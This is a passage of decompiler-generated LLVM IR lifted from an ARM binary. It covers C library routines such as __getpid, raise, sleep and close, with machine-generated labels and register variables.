  %v0_12a64 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12a64, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12a68

dec_label_pc_12a68:                               ; preds = %dec_label_pc_12ae8.dec_label_pc_12a68_crit_edge, %entry
  %v0_12a6c = phi i32 [ %v0_12a6c.pre, %dec_label_pc_12ae8.dec_label_pc_12a68_crit_edge ], [ %v0_12a64, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_12a6c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_12a7417 = inttoptr i32 %v0_12a6c to i32*
  %v2_12a7418 = load i32, i32* %v1_12a7417, align 4
  %v3_12a7820 = icmp ne i32 %v2_12a7418, 0
  store i1 %v3_12a7820, i1* %cpsr_c.global-to-local, align 1
  %v9_12a7826 = icmp eq i32 %v2_12a7418, 1
  br i1 %v9_12a7826, label %dec_label_pc_12a80, label %dec_label_pc_12a98

dec_label_pc_12a80:                               ; preds = %dec_label_pc_12a68, %dec_label_pc_12a80.dec_label_pc_12a74_crit_edge
  %v0_12a8027 = phi i32 [ %v1_12a78.pre, %dec_label_pc_12a80.dec_label_pc_12a74_crit_edge ], [ 1, %dec_label_pc_12a68 ]
  store i32 %v0_12a8027, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_12a90 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_12a90, label %dec_label_pc_12a94, label %dec_label_pc_12a80.dec_label_pc_12a74_crit_edge

dec_label_pc_12a80.dec_label_pc_12a74_crit_edge:  ; preds = %dec_label_pc_12a80
  %v0_12a74.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12a78.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_12a74 = inttoptr i32 %v0_12a74.pre to i32*
  %v2_12a74 = load i32, i32* %v1_12a74, align 4
  %v3_12a78 = icmp uge i32 %v2_12a74, %v1_12a78.pre
  store i1 %v3_12a78, i1* %cpsr_c.global-to-local, align 1
  %v9_12a78 = icmp eq i32 %v2_12a74, %v1_12a78.pre
  br i1 %v9_12a78, label %dec_label_pc_12a80, label %dec_label_pc_12a98

dec_label_pc_12a94:                               ; preds = %dec_label_pc_12a80
  %v0_12a94 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12a98

dec_label_pc_12a98:                               ; preds = %dec_label_pc_12a68, %dec_label_pc_12a80.dec_label_pc_12a74_crit_edge, %dec_label_pc_12a94
  %v0_12a98 = phi i32 [ %v0_12a94, %dec_label_pc_12a94 ], [ %v2_12a7418, %dec_label_pc_12a68 ], [ %v2_12a74, %dec_label_pc_12a80.dec_label_pc_12a74_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12a98 = icmp eq i32 %v0_12a98, 0
  %v0_12abc.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_12a98, label %dec_label_pc_12ab8, label %dec_label_pc_12aa0

dec_label_pc_12aa0:                               ; preds = %dec_label_pc_12a98
  store i32 %v0_12abc.pre, i32* %r0.global-to-local, align 4
  %v0_12aa4 = load i32, i32* %r1.global-to-local, align 4
  %v1_12aa4 = add i32 %v0_12aa4, 126
  store i32 %v1_12aa4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12ab8

dec_label_pc_12ab8:                               ; preds = %dec_label_pc_12a98, %dec_label_pc_12aa0
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_12abc.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_12ac428 = inttoptr i32 %v0_12abc.pre to i32*
  %v2_12ac429 = load i32, i32* %v1_12ac428, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_12ac836 = icmp eq i32 %v2_12ac429, 0
  br i1 %v9_12ac836, label %dec_label_pc_12ad0, label %dec_label_pc_12ae8

dec_label_pc_12ad0:                               ; preds = %dec_label_pc_12ab8, %dec_label_pc_12ad0.dec_label_pc_12ac4_crit_edge
  %v0_12ad037 = phi i32 [ %v1_12ac8.pre, %dec_label_pc_12ad0.dec_label_pc_12ac4_crit_edge ], [ 0, %dec_label_pc_12ab8 ]
  store i32 %v0_12ad037, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_12ae0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_12ae0, label %dec_label_pc_12ae4, label %dec_label_pc_12ad0.dec_label_pc_12ac4_crit_edge

dec_label_pc_12ad0.dec_label_pc_12ac4_crit_edge:  ; preds = %dec_label_pc_12ad0
  %v0_12ac4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12ac8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_12ac4 = inttoptr i32 %v0_12ac4.pre to i32*
  %v2_12ac4 = load i32, i32* %v1_12ac4, align 4
  %v3_12ac8 = icmp uge i32 %v2_12ac4, %v1_12ac8.pre
  store i1 %v3_12ac8, i1* %cpsr_c.global-to-local, align 1
  %v9_12ac8 = icmp eq i32 %v2_12ac4, %v1_12ac8.pre
  br i1 %v9_12ac8, label %dec_label_pc_12ad0, label %dec_label_pc_12ae8

dec_label_pc_12ae4:                               ; preds = %dec_label_pc_12ad0
  %v0_12ae4 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12ae8

dec_label_pc_12ae8:                               ; preds = %dec_label_pc_12ab8, %dec_label_pc_12ad0.dec_label_pc_12ac4_crit_edge, %dec_label_pc_12ae4
  %v0_12ae8 = phi i32 [ %v0_12ae4, %dec_label_pc_12ae4 ], [ %v2_12ac429, %dec_label_pc_12ab8 ], [ %v2_12ac4, %dec_label_pc_12ad0.dec_label_pc_12ac4_crit_edge ]
  %v1_12ae8 = phi i32 [ %v0_12ae4, %dec_label_pc_12ae4 ], [ 0, %dec_label_pc_12ab8 ], [ %v1_12ac8.pre, %dec_label_pc_12ad0.dec_label_pc_12ac4_crit_edge ]
  %v3_12ae8 = icmp uge i32 %v0_12ae8, %v1_12ae8
  store i1 %v3_12ae8, i1* %cpsr_c.global-to-local, align 1
  %v9_12ae8 = icmp eq i32 %v0_12ae8, %v1_12ae8
  br i1 %v9_12ae8, label %dec_label_pc_12af0, label %dec_label_pc_12ae8.dec_label_pc_12a68_crit_edge

dec_label_pc_12ae8.dec_label_pc_12a68_crit_edge:  ; preds = %dec_label_pc_12ae8
  %v0_12a6c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12a68

dec_label_pc_12af0:                               ; preds = %dec_label_pc_12ae8
  %v2_12af0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12af0, i32* %r4.global-to-local, align 4
  %v1_12af4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_12af4

; uselistorder directives
  uselistorder i32 %v0_12ae4, { 1, 0 }
  uselistorder i32 %v1_12ac8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_12a78.pre, { 2, 1, 0 }
  uselistorder i32 %v2_12a7418, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 1, 5, 7, 6, 0 }
  uselistorder i32 126, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12ae8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12ad0, { 1, 0 }
  uselistorder label %dec_label_pc_12ab8, { 1, 0 }
  uselistorder label %dec_label_pc_12a98, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12a80, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12af8 = load i32, i32* @r7, align 4
  store i32 %v3_12af8, i32* %stack_var_-8, align 4
  %v0_12afc = call i32 @__aeabi_read_tp()
  store i32 %v0_12afc, i32* %r0.global-to-local, align 4
  %v1_12b00 = add i32 %v0_12afc, -1060
  %v2_12b00 = inttoptr i32 %v1_12b00 to i32*
  %v3_12b00 = load i32, i32* %v2_12b00, align 4
  %tmp7 = icmp slt i32 %v3_12b00, 1
  br i1 %tmp7, label %dec_label_pc_12b10, label %dec_label_pc_12b34

dec_label_pc_12b10:                               ; preds = %entry
  %v2_12b04 = icmp eq i32 %v3_12b00, 0
  br i1 %v2_12b04, label %dec_label_pc_12b14, label %dec_label_pc_12b20

dec_label_pc_12b14:                               ; preds = %dec_label_pc_12b10
  %v1_12b14 = add i32 %v0_12afc, -1064
  %v2_12b14 = inttoptr i32 %v1_12b14 to i32*
  %v3_12b14 = load i32, i32* %v2_12b14, align 4
  store i32 %v3_12b14, i32* %r0.global-to-local, align 4
  %v2_12b18 = icmp eq i32 %v3_12b14, 0
  br i1 %v2_12b18, label %bb, label %bb8

dec_label_pc_12b20:                               ; preds = %dec_label_pc_12b10
  br label %bb8

bb:                                               ; preds = %dec_label_pc_12b14
  store i32 0, i32* %v2_12b14, align 4
  %v0_12b30.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_12b20, %dec_label_pc_12b14, %bb
  %v0_12b30 = phi i32 [ %v3_12b14, %dec_label_pc_12b14 ], [ %v0_12afc, %dec_label_pc_12b20 ], [ %v0_12b30.pre, %bb ]
  br label %dec_label_pc_12b34

dec_label_pc_12b34:                               ; preds = %entry, %bb8
  %v0_12b34 = phi i32 [ %v3_12b00, %entry ], [ %v0_12b30, %bb8 ]
  store i32 %v0_12b34, i32* %r0.global-to-local, align 4
  %v2_12b38 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12b38, i32* @r7, align 4
  ret i32 %v0_12b34

; uselistorder directives
  uselistorder i32 %v0_12b34, { 1, 0 }
  uselistorder i32 %v3_12b00, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12b34, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12b40 = load i32, i32* @r4, align 4
  store i32 %v3_12b40, i32* %stack_var_-20, align 4
  %v0_12b48 = call i32 @__aeabi_read_tp()
  store i32 %v0_12b48, i32* %r0.global-to-local, align 4
  %v1_12b4c = add i32 %v0_12b48, -1064
  %v2_12b4c = inttoptr i32 %v1_12b4c to i32*
  %v3_12b4c = load i32, i32* %v2_12b4c, align 4
  store i32 %v3_12b4c, i32* %r4.global-to-local, align 4
  %v2_12b50 = icmp eq i32 %v3_12b4c, 0
  %v1_12b58 = add i32 %v0_12b48, -1060
  %v2_12b58 = inttoptr i32 %v1_12b58 to i32*
  %v3_12b58 = load i32, i32* %v2_12b58, align 4
  store i32 %v3_12b58, i32* %r0.global-to-local, align 4
  br i1 %v2_12b50, label %dec_label_pc_12b60, label %dec_label_pc_12b74

dec_label_pc_12b60:                               ; preds = %entry
  store i32 %v3_12b58, i32* %r4.global-to-local, align 4
  store i32 %v3_12b58, i32* %v2_12b4c, align 4
  %v0_12b9c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_12b74:                               ; preds = %entry
  %v5_12b78 = icmp sgt i32 %v3_12b58, 0
  br i1 %v5_12b78, label %bb28, label %dec_label_pc_12b7c

dec_label_pc_12b7c:                               ; preds = %dec_label_pc_12b74
  %tmp = bitcast i32 %v3_12b58 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_12b7c = bitcast float %tmp30 to i32
  %v2_12b80 = icmp eq i32 %v1_12b7c, 0
  br i1 %v2_12b80, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12b7c
  store i32 %v3_12b4c, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_12b7c
  %v2_12b88 = sub i32 0, %v3_12b58
  store i32 %v2_12b88, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_12b74, %dec_label_pc_12b60, %.thread
  %v0_12ba0 = phi i32 [ %v3_12b58, %dec_label_pc_12b74 ], [ %v0_12b9c.pre, %dec_label_pc_12b60 ], [ %v3_12b4c, %bb ], [ %v2_12b88, %.thread ]
  store i32 %v0_12ba0, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_12ba0, -4095
  br i1 %tmp31, label %dec_label_pc_12bc4, label %dec_label_pc_12bac

dec_label_pc_12bac:                               ; preds = %bb28
  %v0_12bb0 = call i32 @__aeabi_read_tp()
  %v3_12bb4 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_12bb4 = sext i16 %v3_12bb4 to i32
  %v0_12bb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_12bb8 = sub i32 0, %v0_12bb8
  store i32 %v1_12bb8, i32* %r2.global-to-local, align 4
  %v3_12bbc = add i32 %v4_12bb4, %v0_12bb0
  %v4_12bbc = inttoptr i32 %v3_12bbc to i32*
  store i32 %v1_12bb8, i32* %v4_12bbc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12bc4

dec_label_pc_12bc4:                               ; preds = %bb28, %dec_label_pc_12bac
  %v0_12bc8 = phi i32 [ %v0_12ba0, %bb28 ], [ -1, %dec_label_pc_12bac ]
  %v3_12bc4 = icmp eq i32 %v0_12bc8, -1
  store i32 %v0_12bc8, i32* %r5.global-to-local, align 4
  br i1 %v3_12bc4, label %dec_label_pc_12bd0, label %dec_label_pc_12c18

dec_label_pc_12bd0:                               ; preds = %dec_label_pc_12bc4
  %v0_12bd4 = call i32 @__aeabi_read_tp()
  store i32 %v0_12bd4, i32* %r0.global-to-local, align 4
  %v3_12bd8 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_12bd8 = sext i16 %v3_12bd8 to i32
  %v2_12bdc = add i32 %v4_12bd8, %v0_12bd4
  %v3_12bdc = inttoptr i32 %v2_12bdc to i32*
  %v4_12bdc = load i32, i32* %v3_12bdc, align 4
  %v7_12be0 = icmp eq i32 %v4_12bdc, 38
  br i1 %v7_12be0, label %dec_label_pc_12bec, label %dec_label_pc_12bd0.dec_label_pc_12c18_crit_edge

dec_label_pc_12bd0.dec_label_pc_12c18_crit_edge:  ; preds = %dec_label_pc_12bd0
  %v0_12c18.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12c18

dec_label_pc_12bec:                               ; preds = %dec_label_pc_12bd0
  %v0_12bec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12bec, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_12bec, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_12bec
  %v5_12c04 = sub i32 0, %v0_12bec
  store i32 %v5_12c04, i32* %r2.global-to-local, align 4
  %v7_12c08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_12c10.752 to i32), i32 57660) to i32*), align 4
  %v4_12c0c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_12c0c, i32* %r0.global-to-local, align 4
  %v7_12c10 = add i32 %v7_12c08, %v0_12bd4
  %v8_12c10 = inttoptr i32 %v7_12c10 to i32*
  store i32 %v5_12c04, i32* %v8_12c10, align 4
  %v0_12c14.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_12bec, %bb29
  %v0_12c14 = phi i32 [ %v0_12c14.pre, %bb29 ], [ %v0_12bec, %dec_label_pc_12bec ]
  store i32 %v0_12c14, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12c18

dec_label_pc_12c18:                               ; preds = %dec_label_pc_12bd0.dec_label_pc_12c18_crit_edge, %dec_label_pc_12bc4, %.thread22
  %v0_12c18 = phi i32 [ %v0_12c18.pre, %dec_label_pc_12bd0.dec_label_pc_12c18_crit_edge ], [ %v0_12bc8, %dec_label_pc_12bc4 ], [ %v0_12c14, %.thread22 ]
  store i32 %v0_12c18, i32* %r0.global-to-local, align 4
  %v2_12c1c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12c1c, i32* @r4, align 4
  ret i32 %v0_12c18

; uselistorder directives
  uselistorder i32 %v0_12c18, { 1, 0 }
  uselistorder i32 %v0_12bec, { 1, 2, 0, 3 }
  uselistorder i32 %v0_12ba0, { 2, 0, 1 }
  uselistorder i32 %v3_12b58, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_12c18, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_12bc4, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_12c30 = load i32, i32* @r4, align 4
  %v6_12c30 = load i32, i32* @r5, align 4
  %v9_12c30 = load i32, i32* @r6, align 4
  %v12_12c30 = load i32, i32* @r7, align 4
  %v15_12c30 = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12c40 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_12c40, label %dec_label_pc_12c54, label %dec_label_pc_12cc8

dec_label_pc_12c54:                               ; preds = %entry
  %v0_12c54 = call i32 @__aeabi_read_tp()
  %v1_12c58 = add i32 %v0_12c54, -1036
  %v2_12c58 = inttoptr i32 %v1_12c58 to i32*
  %v3_12c58 = load i32, i32* %v2_12c58, align 4
  %v1_12c5c = and i32 %v3_12c58, -71
  %v2_12c60 = icmp ugt i32 %v1_12c5c, 7
  store i1 %v2_12c60, i1* %cpsr_c.global-to-local, align 1
  %v7_12c60 = icmp eq i32 %v1_12c5c, 8
  %v1_12c64 = add i32 %v0_12c54, -1168
  store i32 %v1_12c64, i32* @r5, align 4
  br i1 %v7_12c60, label %dec_label_pc_12c6c, label %dec_label_pc_12d40

dec_label_pc_12c6c:                               ; preds = %dec_label_pc_12c54
  %v2_12c70 = add i32 %v0_12c54, -624
  %v3_12c70 = inttoptr i32 %v2_12c70 to i32*
  store i32 -1, i32* %v3_12c70, align 4
  %v0_12c74 = load i32, i32* @r5, align 4
  %v1_12c74 = add i32 %v0_12c74, 132
  store i32 %v1_12c74, i32* @r6, align 4
  br label %dec_label_pc_12c78

dec_label_pc_12c78:                               ; preds = %dec_label_pc_12cac.dec_label_pc_12c78_crit_edge, %dec_label_pc_12c6c
  %v0_12c7c = phi i32 [ %v0_12c7c.pre, %dec_label_pc_12cac.dec_label_pc_12c78_crit_edge ], [ %v1_12c74, %dec_label_pc_12c6c ]
  %v0_12c78 = phi i32 [ %v0_12cb4, %dec_label_pc_12cac.dec_label_pc_12c78_crit_edge ], [ %v0_12c74, %dec_label_pc_12c6c ]
  %v1_12c78 = add i32 %v0_12c78, 132
  %v2_12c78 = inttoptr i32 %v1_12c78 to i32*
  %v3_12c78 = load i32, i32* %v2_12c78, align 4
  store i32 %v0_12c7c, i32* %r2.global-to-local, align 4
  store i32 %v3_12c78, i32* @r4, align 4
  %v1_12c8830 = inttoptr i32 %v0_12c7c to i32*
  %v2_12c8831 = load i32, i32* %v1_12c8830, align 4
  %v3_12c8c33 = icmp uge i32 %v2_12c8831, %v3_12c78
  store i1 %v3_12c8c33, i1* %cpsr_c.global-to-local, align 1
  %v9_12c8c39 = icmp eq i32 %v2_12c8831, %v3_12c78
  br i1 %v9_12c8c39, label %dec_label_pc_12c94, label %dec_label_pc_12cac

dec_label_pc_12c94:                               ; preds = %dec_label_pc_12c78, %dec_label_pc_12c94.dec_label_pc_12c88_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_12ca4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_12ca4, label %dec_label_pc_12ca8, label %dec_label_pc_12c94.dec_label_pc_12c88_crit_edge

dec_label_pc_12c94.dec_label_pc_12c88_crit_edge:  ; preds = %dec_label_pc_12c94
  %v0_12c88.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12c8c.pre = load i32, i32* @r4, align 4
  %v1_12c88 = inttoptr i32 %v0_12c88.pre to i32*
  %v2_12c88 = load i32, i32* %v1_12c88, align 4
  %v3_12c8c = icmp uge i32 %v2_12c88, %v1_12c8c.pre
  store i1 %v3_12c8c, i1* %cpsr_c.global-to-local, align 1
  %v9_12c8c = icmp eq i32 %v2_12c88, %v1_12c8c.pre
  br i1 %v9_12c8c, label %dec_label_pc_12c94, label %dec_label_pc_12cac

dec_label_pc_12ca8:                               ; preds = %dec_label_pc_12c94
  %v0_12ca8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_12cac

dec_label_pc_12cac:                               ; preds = %dec_label_pc_12c78, %dec_label_pc_12c94.dec_label_pc_12c88_crit_edge, %dec_label_pc_12ca8
  %v0_12cac = phi i32 [ %v0_12ca8, %dec_label_pc_12ca8 ], [ %v2_12c8831, %dec_label_pc_12c78 ], [ %v2_12c88, %dec_label_pc_12c94.dec_label_pc_12c88_crit_edge ]
  %v1_12cac = phi i32 [ %v0_12ca8, %dec_label_pc_12ca8 ], [ %v3_12c78, %dec_label_pc_12c78 ], [ %v1_12c8c.pre, %dec_label_pc_12c94.dec_label_pc_12c88_crit_edge ]
  %v3_12cac = icmp uge i32 %v0_12cac, %v1_12cac
  store i1 %v3_12cac, i1* %cpsr_c.global-to-local, align 1
  %v9_12cac = icmp eq i32 %v0_12cac, %v1_12cac
  br i1 %v9_12cac, label %dec_label_pc_12cb4, label %dec_label_pc_12cac.dec_label_pc_12c78_crit_edge

dec_label_pc_12cac.dec_label_pc_12c78_crit_edge:  ; preds = %dec_label_pc_12cac
  %v0_12cb4 = load i32, i32* @r5, align 4
  %v0_12c7c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12c78

dec_label_pc_12cb4:                               ; preds = %dec_label_pc_12cac
  %v0_12cbc = load i32, i32* @r7, align 4
  %v2_12cbc = add i32 %v0_12cbc, 116
  %v3_12cbc = inttoptr i32 %v2_12cbc to i32*
  %v4_12cbc = load i32, i32* %v3_12cbc, align 4
  store i32 77000, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12cbc)
  %v0_12cd0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12cc8

dec_label_pc_12cc8:                               ; preds = %entry, %dec_label_pc_12cb4
  %v0_12cd0 = phi i32 [ 0, %entry ], [ %v0_12cd0.pre, %dec_label_pc_12cb4 ]
  %v2_12cd4 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_12cd4, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_12ce0 = call i32 @__libc_sigaction(i32 17, i32 %v0_12cd0, i32 %v2_12cd4)
  %v3_12ce4 = load i32, i32* %stack_var_-60, align 4
  %v2_12ce8 = icmp ne i32 %v3_12ce4, 0
  store i1 %v2_12ce8, i1* %cpsr_c.global-to-local, align 1
  %v7_12ce8 = icmp eq i32 %v3_12ce4, 1
  br i1 %v7_12ce8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12cc8
  %v3_12cec = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_12cec, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12cc8, %bb
  call void @__pseudo_cond_branch(i1 %v7_12ce8, i32 ptrtoint (i32* @global_var_10078.756 to i32))
  %v2_12cfc = ptrtoint i32* %stack_var_-32 to i32
  %v2_12d04 = call i32 @__libc_nanosleep(i32 %v2_12cfc, i32 %v2_12cfc)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12d08 = icmp eq i32 %v2_12d04, 0
  br i1 %v2_12d08, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_12d1c = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_12d1c, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_12d2c = load i32, i32* %stack_var_-40, align 4
  %v1_12d30 = and i32 %v3_12d2c, 65536
  store i32 %v1_12d30, i32* %r2.global-to-local, align 4
  %v2_12d30 = icmp eq i32 %v1_12d30, 0
  br i1 %v2_12d30, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_12d38 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_12d38, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_12d30, i32 ptrtoint (i32* @global_var_10078.756 to i32))
  br label %dec_label_pc_12d40

dec_label_pc_12d40:                               ; preds = %dec_label_pc_12c54, %.thread5
  %v0_12d40 = load i32, i32* @r4, align 4
  store i32 %v3_12c30, i32* @r4, align 4
  store i32 %v6_12c30, i32* @r5, align 4
  store i32 %v9_12c30, i32* @r6, align 4
  store i32 %v12_12c30, i32* @r7, align 4
  store i32 %v15_12c30, i32* @lr, align 4
  ret i32 %v0_12d40

; uselistorder directives
  uselistorder i32 %v0_12ca8, { 1, 0 }
  uselistorder i32 %v1_12c8c.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12d40, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_12cc8, { 1, 0 }
  uselistorder label %dec_label_pc_12cac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12c94, { 1, 0 }
}

define i32 @function_12d54(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12d54:
  %v0_12d54 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12d54, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12d54
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_12d54 = load i32, i32* @r4, align 4
  %v4_12d54 = lshr i32 %v2_12d54, %arg1
  %v5_12d54 = sub i32 32, %arg1
  %v6_12d54 = shl i32 %v2_12d54, %v5_12d54
  %v7_12d54 = or i32 %v6_12d54, %v4_12d54
  %v9_12d54 = and i32 %v7_12d54, %arg1
  store i32 %tmp, i32* %arg2, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12d54, %bb
  %v8_12d60 = phi i32 [ %arg1, %dec_label_pc_12d54 ], [ %v9_12d54, %bb ]
  ret i32 %v8_12d60

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_12d74 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_12d74, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_12d74 = load i32, i32* @r0, align 4
  ret i32 %v2_12d74

bb1:                                              ; preds = %entry
  %v0_12d78 = call i32 @__syscall_error()
  ret i32 %v0_12d78
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12d84 = load i32, i32* @global_var_23e80.759, align 4
  %v2_12d88 = icmp eq i32 %v3_12d84, 0
  store i1 %v2_12d88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12d88, label %dec_label_pc_12d90, label %entry.dec_label_pc_12dac_crit_edge

entry.dec_label_pc_12dac_crit_edge:               ; preds = %entry
  %v3_12dac.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_12dac

dec_label_pc_12d90:                               ; preds = %entry
  %v0_12d90 = load i32, i32* @r7, align 4
  store i32 %v0_12d90, i32* @ip, align 4
  %v0_12da0 = load i32, i32* @r0, align 4
  %v2_12da0 = icmp ugt i32 %v0_12da0, -4097
  %v7_12da0 = icmp eq i32 %v0_12da0, -4096
  store i1 %v7_12da0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12da0, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_12dac, %bb8, %bb9, %dec_label_pc_12d90
  %merge2 = phi i32 [ %v0_12da0, %dec_label_pc_12d90 ], [ %v0_12dd0, %dec_label_pc_12dac ], [ %v0_12de0, %bb8 ], [ %v0_12de0, %bb9 ]
  ret i32 %merge2

bb7:                                              ; preds = %dec_label_pc_12d90
